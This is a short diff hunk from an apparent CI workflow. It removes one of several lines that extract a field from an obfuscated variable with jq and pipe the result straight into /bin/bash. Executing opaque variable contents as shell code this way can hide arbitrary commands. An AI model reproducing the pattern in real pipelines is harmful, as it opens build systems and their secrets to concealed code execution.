@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$bjdri151" | jq -r .xpgb01942 | /bin/bash
           echo $l8439 | jq -r .qipfo1 | /bin/bash
-          printf '%s' "$u99761" | jq -r .rn52280 | /bin/bash
           echo $ysm7186 | jq -r .i8 | /bin/bash
 
       - name: Store output
